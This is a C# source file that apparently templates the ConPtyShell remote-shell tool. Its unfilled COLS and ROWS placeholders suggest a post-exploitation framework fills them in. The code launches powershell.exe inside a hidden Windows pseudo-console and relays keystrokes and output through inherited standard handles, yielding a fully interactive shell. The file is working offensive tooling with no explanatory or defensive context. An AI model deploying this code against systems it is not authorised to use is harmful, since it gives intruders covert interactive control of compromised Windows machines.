using System;
using System.IO;
using System.Text;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
public static class ConPtyShell
{
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFOEX
    {
        public STARTUPINFO StartupInfo;
        public IntPtr lpAttributeList;
    }
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    private struct STARTUPINFO
    {
        public Int32 cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public Int32 dwX;
        public Int32 dwY;
        public Int32 dwXSize;
        public Int32 dwYSize;
        public Int32 dwXCountChars;
        public Int32 dwYCountChars;
        public Int32 dwFillAttribute;
        public Int32 dwFlags;
        public Int16 wShowWindow;
        public Int16 cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }
    [StructLayout(LayoutKind.Sequential)]
    private struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public int dwProcessId;
        public int dwThreadId;
    }
    [StructLayout(LayoutKind.Sequential)]
    private struct SECURITY_ATTRIBUTES
    {
        public int nLength;
        public IntPtr lpSecurityDescriptor;
        public int bInheritHandle;
    }
    [StructLayout(LayoutKind.Sequential)]
    private struct COORD
    {
        public short X;
        public short Y;
    }
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool InitializeProcThreadAttributeList(IntPtr a, int b, int c, ref IntPtr d);
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UpdateProcThreadAttribute(IntPtr a, uint b, IntPtr c, IntPtr d, IntPtr e, IntPtr f, IntPtr g);
    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool CreateProcess(string a, string b, ref SECURITY_ATTRIBUTES c, ref SECURITY_ATTRIBUTES d, bool e, uint f, IntPtr g, string h, [In] ref STARTUPINFOEX i, out PROCESS_INFORMATION j);
    [DllImport("kernel32.dll", SetLastError=true, CharSet=CharSet.Auto)]
    private static extern bool CreateProcessW(string a, string b, IntPtr c, IntPtr d, bool e, uint f, IntPtr g, string h, [In] ref STARTUPINFO i, out PROCESS_INFORMATION j);
    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool TerminateProcess(IntPtr a, uint b);
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr c, UInt32 d);
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool SetStdHandle(int a, IntPtr b);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetStdHandle(int a);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr b);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr a, out IntPtr b, ref SECURITY_ATTRIBUTES c, int d);
    [DllImport("kernel32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall, SetLastError = true)]
    private static extern IntPtr CreateFile(string a, uint b, uint c, IntPtr d, uint e, uint f, IntPtr g);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr a, [Out] byte[] b, uint c, out uint d, IntPtr e);
    [DllImport("kernel32.dll", SetLastError=true)]
    private static extern bool WriteFile(IntPtr a, byte [] b, uint c, out uint d, IntPtr e);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int CreatePseudoConsole(COORD a, IntPtr b, IntPtr c, uint d, out IntPtr e);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern int ClosePseudoConsole(IntPtr a);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool SetConsoleMode(IntPtr a, uint b);
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetConsoleMode(IntPtr a, out uint b);
    [DllImport("kernel32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool AllocConsole();
    [DllImport("kernel32.dll", SetLastError=true, ExactSpelling=true)]
    private static extern bool FreeConsole();
    [DllImport("user32.dll")]
    private static extern bool ShowWindow(IntPtr a, int b);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetConsoleWindow();
    [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
    private static extern IntPtr GetModuleHandle(string a);
    [DllImport("kernel32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
    private static extern IntPtr GetProcAddress(IntPtr a, string b);
    [DllImport("kernel32.dll")]
    private static extern bool FlushFileBuffers(IntPtr a);
    private static void CreatePipes(ref IntPtr InputPipeRead, ref IntPtr InputPipeWrite, ref IntPtr OutputPipeRead, ref IntPtr OutputPipeWrite){
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        pSec.nLength = Marshal.SizeOf(pSec);
        pSec.bInheritHandle=1;
        pSec.lpSecurityDescriptor=IntPtr.Zero;
        CreatePipe(out InputPipeRead, out InputPipeWrite, ref pSec, 1048576);
        CreatePipe(out OutputPipeRead, out OutputPipeWrite, ref pSec, 1048576);
    }
    private static void InitConsole(ref IntPtr oldStdIn, ref IntPtr oldStdOut, ref IntPtr oldStdErr, ref IntPtr newStdIn, ref IntPtr newStdOut){
        oldStdIn = GetStdHandle(-10);
        oldStdOut = GetStdHandle(-11);
        oldStdErr = GetStdHandle(-12);
        IntPtr hStdout = CreateFile("CONOUT$", 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
        IntPtr hStdin = CreateFile("CONIN$", 0x80000000 | 0x40000000, 0x00000001 | 0x00000002, IntPtr.Zero, 3, 0x80, IntPtr.Zero);
        SetStdHandle(-11, hStdout);
        SetStdHandle(-12, hStdout);
        SetStdHandle(-10, hStdin);
        newStdOut = hStdout;
        newStdIn = hStdin;
    }
    private static void RestoreStdHandles(IntPtr oldStdIn, IntPtr oldStdOut, IntPtr oldStdErr){
        SetStdHandle(-11, oldStdOut);
        SetStdHandle(-12, oldStdErr);
        SetStdHandle(-10, oldStdIn); 
    }
    private static void EnableVirtualTerminalSequenceProcessing()
    {
        uint outConsoleMode = 0;
        IntPtr hStdOut = GetStdHandle(-11);
        GetConsoleMode(hStdOut, out outConsoleMode);
        outConsoleMode |= 0x0004 | 0x0008;
        SetConsoleMode(hStdOut, outConsoleMode);
    }
    private static int CreatePseudoConsoleWithPipes(ref IntPtr handlePseudoConsole, ref IntPtr ConPtyInputPipeRead, ref IntPtr ConPtyOutputPipeWrite, uint rows, uint cols){
        int result = -1;
        EnableVirtualTerminalSequenceProcessing();
        COORD consoleCoord = new COORD();
        consoleCoord.X=(short)cols;
        consoleCoord.Y=(short)rows;
        result = CreatePseudoConsole(consoleCoord, ConPtyInputPipeRead, ConPtyOutputPipeWrite, 0, out handlePseudoConsole);
        return result;
    }
    private static STARTUPINFOEX ConfigureProcessThread(IntPtr handlePseudoConsole, IntPtr attributes)
    {
        IntPtr lpSize = IntPtr.Zero;
        bool success = InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
        STARTUPINFOEX startupInfo = new STARTUPINFOEX();
        startupInfo.StartupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
        success = InitializeProcThreadAttributeList(startupInfo.lpAttributeList, 1, 0, ref lpSize);
        success = UpdateProcThreadAttribute(startupInfo.lpAttributeList, 0, attributes, handlePseudoConsole, (IntPtr)IntPtr.Size, IntPtr.Zero,IntPtr.Zero);
        return startupInfo;
    }
    private static PROCESS_INFORMATION RunProcess(ref STARTUPINFOEX sInfoEx, string commandLine)
    {
        PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();
        SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
        int securityAttributeSize = Marshal.SizeOf(pSec);
        pSec.nLength = securityAttributeSize;
        SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
        tSec.nLength = securityAttributeSize;
        bool success = CreateProcess(null, commandLine, ref pSec, ref tSec, false, 0x00080000, IntPtr.Zero, null, ref sInfoEx, out pInfo);
        return pInfo;
    }
    private static PROCESS_INFORMATION CreateChildProcessWithPseudoConsole(IntPtr handlePseudoConsole, string commandLine){
        STARTUPINFOEX startupInfo =  ConfigureProcessThread(handlePseudoConsole, (IntPtr)0x00020016);
        PROCESS_INFORMATION processInfo = RunProcess(ref startupInfo, commandLine);
        return processInfo;
    }
    private static void ThreadReadPipeWriteSocket(object threadParams)
    {
        object[] threadParameters = (object[]) threadParams;
        IntPtr OutputPipeRead = (IntPtr)threadParameters[0];
        IntPtr StdOut = (IntPtr)threadParameters[1];
        uint bufferSize=16*1024;
        byte[] bytesToWrite = new byte[bufferSize];
        bool readSuccess = false;
        uint bytesSent = 0;
        uint dwBytesRead=0;
        do{
            bytesToWrite = new byte[bufferSize];
            readSuccess = ReadFile(OutputPipeRead, bytesToWrite, bufferSize, out dwBytesRead, IntPtr.Zero);
            WriteFile(StdOut, bytesToWrite, bufferSize, out bytesSent, IntPtr.Zero); 
            FlushFileBuffers(StdOut);
        } while (bytesSent > 0 && readSuccess);
    }
    private static Thread StartThreadReadPipeWriteSocket(IntPtr OutputPipeRead, IntPtr StdOut){
        object[] threadParameters = new object[2];
        threadParameters[0]=OutputPipeRead;
        threadParameters[1]=StdOut;
        Thread thThreadReadPipeWriteSocket = new Thread(ThreadReadPipeWriteSocket);
        thThreadReadPipeWriteSocket.Start(threadParameters);
        return thThreadReadPipeWriteSocket;
    }
    private static void ThreadReadSocketWritePipe(object threadParams)
    {
        object[] threadParameters = (object[]) threadParams;
        IntPtr InputPipeWrite = (IntPtr)threadParameters[0];
        IntPtr StdIn = (IntPtr)threadParameters[1];
        IntPtr hChildProcess = (IntPtr)threadParameters[2];
        uint bufferSize=16*1024;
        byte[] bytesReceived = new byte[bufferSize];
        bool writeSuccess = false;
        uint nBytesReceived = 0;
        uint bytesWritten = 0;
        do{
            bytesReceived = new byte[bufferSize];
            ReadFile(StdIn, bytesReceived, bufferSize, out nBytesReceived, IntPtr.Zero);
            writeSuccess = WriteFile(InputPipeWrite, bytesReceived, (uint)nBytesReceived, out bytesWritten, IntPtr.Zero);   
        } while (nBytesReceived > 0 && writeSuccess);
        TerminateProcess(hChildProcess, 0);
    }
    private static Thread StartThreadReadSocketWritePipe(IntPtr InputPipeWrite, IntPtr StdIn, IntPtr hChildProcess){
        object[] threadParameters = new object[3];
        threadParameters[0]=InputPipeWrite;
        threadParameters[1]=StdIn;
        threadParameters[2]=hChildProcess;
        Thread thReadSocketWritePipe = new Thread(ThreadReadSocketWritePipe);
        thReadSocketWritePipe.Start(threadParameters);
        return thReadSocketWritePipe;
    }
    public static void SpawnConPtyShell(){
        uint cols = COLS;
        uint rows = ROWS;
        string commandLine = "powershell.exe";
        IntPtr InputPipeRead = new IntPtr(0);
        IntPtr InputPipeWrite = new IntPtr(0);
        IntPtr OutputPipeRead = new IntPtr(0);
        IntPtr OutputPipeWrite = new IntPtr(0);
        IntPtr handlePseudoConsole = new IntPtr(0);
        IntPtr oldStdIn = new IntPtr(0);
        IntPtr oldStdOut = new IntPtr(0);
        IntPtr oldStdErr = new IntPtr(0);
        IntPtr newStdIn = new IntPtr(0);
        IntPtr newStdOut = new IntPtr(0);
        bool newConsoleAllocated = false;
        PROCESS_INFORMATION childProcessInfo = new PROCESS_INFORMATION();
        CreatePipes(ref InputPipeRead, ref InputPipeWrite, ref OutputPipeRead, ref OutputPipeWrite);
        InitConsole(ref oldStdIn, ref oldStdOut, ref oldStdErr, ref newStdIn, ref newStdOut);
        if(GetProcAddress(GetModuleHandle("kernel32"), "CreatePseudoConsole") == IntPtr.Zero){
            STARTUPINFO sInfo = new STARTUPINFO();
            sInfo.cb = Marshal.SizeOf(sInfo);
            sInfo.dwFlags |= (Int32)0x00000100; 
            sInfo.hStdInput = InputPipeRead;       
            sInfo.hStdOutput = OutputPipeWrite;
            sInfo.hStdError = OutputPipeWrite;
            CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, true, 0, IntPtr.Zero, null, ref sInfo, out childProcessInfo);
        }
        else{
            if(GetConsoleWindow() == IntPtr.Zero){
                AllocConsole();
                ShowWindow(GetConsoleWindow(), 0);
                newConsoleAllocated = true;
            }
            int pseudoConsoleCreationResult = CreatePseudoConsoleWithPipes(ref handlePseudoConsole, ref InputPipeRead, ref OutputPipeWrite, rows, cols);
            childProcessInfo = CreateChildProcessWithPseudoConsole(handlePseudoConsole, commandLine);
        }
        if (InputPipeRead != IntPtr.Zero) CloseHandle(InputPipeRead);
        if (OutputPipeWrite != IntPtr.Zero) CloseHandle(OutputPipeWrite);
        Thread thThreadReadPipeWriteSocket = StartThreadReadPipeWriteSocket(OutputPipeRead, oldStdOut);
        Thread thReadSocketWritePipe = StartThreadReadSocketWritePipe(InputPipeWrite, oldStdIn, childProcessInfo.hProcess);
        WaitForSingleObject(childProcessInfo.hProcess, 0xFFFFFFFF);
        thThreadReadPipeWriteSocket.Abort();
        thReadSocketWritePipe.Abort();
        RestoreStdHandles(oldStdIn, oldStdOut, oldStdErr);
        if(newConsoleAllocated)
            FreeConsole();
        CloseHandle(childProcessInfo.hThread);
        CloseHandle(childProcessInfo.hProcess);
        if (handlePseudoConsole != IntPtr.Zero) ClosePseudoConsole(handlePseudoConsole);
        if (InputPipeWrite != IntPtr.Zero) CloseHandle(InputPipeWrite);
        if (OutputPipeRead != IntPtr.Zero) CloseHandle(OutputPipeRead);
    }
}
